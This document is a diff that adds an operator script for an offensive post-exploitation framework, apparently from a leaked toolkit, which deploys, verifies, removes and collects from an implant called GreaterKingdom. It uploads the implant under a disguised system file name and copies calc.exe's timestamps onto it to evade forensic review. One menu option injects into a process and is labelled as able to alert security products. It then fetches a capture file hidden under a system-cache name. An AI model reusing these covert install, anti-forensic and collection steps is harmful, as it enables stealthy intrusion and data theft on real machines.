@@ -1,0 +1,308 @@
+#--------------------------------------------------------
+# File: Greaterkingdom.eps
+# 
+# Script to install/uninstall/collect gk
+#--------------------------------------------------------
+
+@include "_FileExists.epm";
+@include "_GenericFunctions.epm";
+@include "_RecordToolUse.epm";
+
+@echo off;
+@case-sensitive off;
+
+string $tool = "GreaterKingdom";
+string $version = "1.0.2.1";
+bool $usage_DEPLOYED = false;
+bool $usage_EXERCISED = false;
+bool $usage_DELETED = false;
+string $status="Successful";
+bool $temp;
+
+
+#--------------------------------------------------------
+# Get path that EP scripts are run out of
+#--------------------------------------------------------
+string $ScriptsDir;
+_GetEPScriptsPath($ScriptsDir);
+
+
+
+int $menuOption;
+string $localPath = "$ScriptsDir\\..\\..\\..\\..\\opsdisk\\tools\\greaterkingdom";
+string $GKUploadFile = "greaterkingdom.exe";
+string $localInstallPath = "$localPath\\$gkUploadFile";
+string $localParsePath = "$localPath\\Gk_LogParser.exe";
+string $fileName = "help32.exe";
+string $capture = "PNFCACHE.1";
+
+#--------------------------------------------------------
+# Get system path
+#--------------------------------------------------------
+string $systemPath;
+ifnot (_GetSystemPath($systemPath)) {
+	return false;
+}
+string $windir;
+$windir = "$systemPath\\..";
+
+
+#--------------------------------------------------------
+# Check to see if help16.exe exists on the target (shouldn't)
+#--------------------------------------------------------
+if (_FileExists ($fileName, "$systemPath")) {
+	$fileName = "winhlp16.exe";
+}
+
+echo "";
+
+
+while (true) {
+	echo "- $tool $version";
+	echo "Verify what install method you can use!!";
+	
+	# print the command list
+	echo "";
+	echo " (0). Exit";
+	echo " (1). !!!!!Install with Inject!!!!! CAN FLAG PSP's";
+	echo " (2). Install with no Inject";
+	echo " (3). Uninstall";
+	echo " (4). Verify Install";
+	echo " (5). Collect and Parse";
+
+	echo "";
+	$menuOption = GetInput("Enter the desired option");
+
+	if ($menuOption == 0) {
+	#--------------------------------------------------------
+	# Quit
+	#--------------------------------------------------------
+		return true;
+
+	} else if ($menuOption == 1) {
+		if(gkInstall($localInstallPath, $gkUploadFile, $systemPath, $fileName, "-f", $capture, $windir)) {
+			echo "success";
+			_RecordToolUse($tool,$version,"DEPLOYED","Successful");
+		}
+		else { echo "failure"; _RecordToolUse($tool,$version,"DEPLOYED","Unuccessful"); }
+	} else if ($menuOption == 2) {
+		if(gkInstall($localInstallPath, $gkUploadFile, $systemPath, $fileName, "-i", $capture, $windir)) {
+			echo "success";
+			_RecordToolUse($tool,$version,"DEPLOYED","Successful");
+		}
+		else { echo "failure"; _RecordToolUse($tool,$version,"DEPLOYED","Unuccessful"); } 
+	}else if ($menuOption == 3) {
+		if(gkunInstall($localInstallPath, $gkUploadFile, $systemPath, $fileName, "-u", $capture, $windir)) { _RecordToolUse($tool,$version,"DELETED","Successful"); }
+		else { _RecordToolUse($tool,$version,"DELETED","Unsuccessful"); }
+	} else if ($menuOption == 4) {
+		if(gkVerify($systemPath)) { _RecordToolUse($tool,$version,"EXERCISED","Successful"); }
+		else { _RecordToolUse($tool,$version,"EXERCISED","Unsuccessful"); }
+	} else if ($menuOption == 5) {
+		ifnot(gkCollect($systemPath, $localParsePath, $capture, $windir)){
+			echo "Collection and parsing could not be completed, please finish manually";
+			_RecordToolUse($tool,$version,"EXERCISED","Unsuccessful");
+		}
+		else { _RecordToolUse($tool,$version,"EXERCISED","Successful"); }
+	} else {
+	#--------------------------------------------------------
+	# Invalid menuOption
+	#--------------------------------------------------------
+		echo "*** Invalid menuOption ***";
+	}
+
+	pause;
+}
+
+
+return false;
+
+
+
+Sub gkInstall(IN string $localInstallPath, IN string $gkUploadFile, IN string $systemPath, IN string $fileName, IN string $command, IN string $capture, IN string $windir)
+{
+	bool $success = true;
+	#--------------------------------------------------------
+	# Install GreaterKingdom - upload and run with -i/f option
+	#--------------------------------------------------------
+	echo "Uploading $gkUploadFile to $systemPath\\$fileName";
+	ifnot(`put $localInstallPath -name "$systemPath\\$fileName"`){
+		echo "Could not put $fileName into $systemPath";
+		$success = false;
+	}else{
+		echo "";
+		echo "Matchtimes $systemPath\\$fileName to $systemPath\\calc.exe";
+		echo "";
+		@echo on;
+		ifnot(`matchtimes "$systemPath\\calc.exe" "$systemPath\\$fileName"`){
+			echo "Could not run matchtimes $systemPath\\$fileName to $systemPath\\calc.exe";
+			$success = false;
+		}else{
+			echo "";
+			if (_FileExists ($capture, "$windir\\inf")) {
+				echo "PNFCACHE.1 file already exists! Seek guidance!";
+				$success = false;
+			}else{
+				echo "Running $fileName on target...\n";
+				echo $command;
+				#@echo on;
+					ifnot(`run -command "$systemPath\\$fileName $command $windir\\inf\\$capture 1" -redirect`)
+						{
+						@echo off;
+						echo "Could not run $systemPath\\$fileName $command";	
+						$success = false;
+						}
+				}
+		}
+	}
+	@echo off;
+	
+	echo "";
+	echo "Deleting $systemPath\\$fileName";
+	ifnot(`del $fileName -path $systemPath`){
+		echo "Could not delete $systemPath\\$fileName";
+		echo "Please delete it manually";
+	}
+	return $success;
+}
+
+Sub gkunInstall(IN string $localInstallPath, IN string $gkUploadFile, IN string $systemPath, IN string $fileName, IN string $command, IN string $capture, IN string $windir)
+{
+	bool $success = true;
+	#--------------------------------------------------------
+	# unInstall GreaterKingdom - upload and run with -i/f option
+	#--------------------------------------------------------
+	echo "Uploading $gkUploadFile to $systemPath\\$fileName";
+	ifnot(`put $localInstallPath -name "$systemPath\\$fileName"`){
+		echo "Could not put $fileName into $systemPath";
+		$success = false;
+	}else{
+		@echo on;
+		echo "";
+		echo "Matchtimes $systemPath\\$fileName to $systemPath\\calc.exe";
+		echo "";
+		ifnot(`matchtimes "$systemPath\\calc.exe" "$systemPath\\$fileName"`){
+			echo "Could not run matchtimes $systemPath\\$fileName to $systemPath\\calc.exe";
+			$success = false;
+			}else{
+				echo "";
+				echo "Running $fileName on target...\n";
+				#@echo on;
+				ifnot(`run -command "$systemPath\\$fileName $command" -redirect`)
+					{
+					@echo off;
+					echo "Could not run $systemPath\\$fileName $command";	
+					$success = false;
+					}
+		}
+	}
+	@echo off;
+	echo "";
+	echo "Deleting $systemPath\\$fileName";
+	ifnot(`del $fileName -path $systemPath`){
+		echo "Could not delete $systemPath\\$fileName";
+		echo "Please delete it manually";
+	}
+	ifnot(`del $capture -path $windir\\inf`){
+		echo "Could not delete capture file";
+		echo "Please delete it manually";
+	}
+	
+	return $success;
+}
+
+Sub gkVerify(IN string $systemPath)
+{
+	#--------------------------------------------------------
+	# Check to see if GreaterKingdom files exist
+	#--------------------------------------------------------
+	bool $logSuccessFlag = true;
+	bool $driverSuccessFlag = true;
+	bool $capSuccessFlag = true;
+	bool $success = true;
+	if (_FileExists ("cryptnet32.dll", "$systemPath")) {
+	echo "cryptnet32.dll file exists ... SUCCESSFUL";
+	} else {
+		echo "cryptnet32.dll file missing ... FAILED";
+		$logSuccessFlag = false;
+
+	echo "";		}
+	if (_FileExists ("w32date.dll", "$systemPath")) {
+		echo "w32date.dll exists ... SUCCESSFUL";
+	} else {
+		echo "w32date.dll missing ... FAILED";
+		$driverSuccessFlag = false;
+	}
+	echo "";
+	if (_FileExists ("PNFCACHE.1", "$systemPath\\..\\inf")) {
+		echo "PNFCACHE.1 exists ... SUCCESSFUL";
+	} else {
+		echo "PNFCACHE.1 missing ... FAILED";
+		$capSuccessFlag = false;
+	}
+	
+
+	echo "";
+	if (($logSuccessFlag == true) && ($driverSuccessFlag == true) && ($capSuccessFlag == true)) {
+		echo "Greaterkingdom properlly installed on target";	
+	} else if ($driverSuccessFlag == false || $logSuccessFlag == false || $capSuccessFlag == false)
+		   {
+		echo "Greaterkingdom is in a bad state...";
+		$success = false;
+	} else {
+		echo "Greaterkingdom doesn't exist on target!";
+		$success = false;
+	}
+	return $success;
+}
+
+
+
+Sub gkCollect(IN string $systemPath, IN string $localParsePath, IN string $capture, IN string $windir)
+{
+	bool $success = true;
+	#--------------------------------------------------------
+	# Download Greaterkingdom and Parse the local file
+	#--------------------------------------------------------
+	echo "$windir\\inf\\$capture";
+	echo "";
+	@record on;
+	ifnot(`copyget "$windir\\inf\\$capture"`){
+		echo "Could not copyget $windir\\inf\\$capture";
+		@record off;
+		return false;
+	}
+	@record off;
+	string $localName = GetCmdData("LocalName");
+
+	string $temp = split("_", $localName);
+	int $counter = 1;
+	string $fileDate = "";
+	while ($counter < sizeOf($temp)) {
+		$fileDate = "$fileDate\_$temp[$counter]";
+		$counter++;
+	}
+
+	echo "";
+
+	echo "";
+	echo "Parsing file...";
+		
+	ifnot(`local run -command "$localParsePath Get_Files\\$localName Get_Files\\GK_out_$filedate.xml"`){
+		echo "Could not run $localParsePath -tu -i";
+		$success = false;
+	}
+	
+
+	echo "";
+	echo "";
+
+	sleep 3000;
+	@echo on;
+	`local dir *$fileDate* -path "Get_Files"`;
+	@echo off;
+	return $success;
+}
+
+
+
+
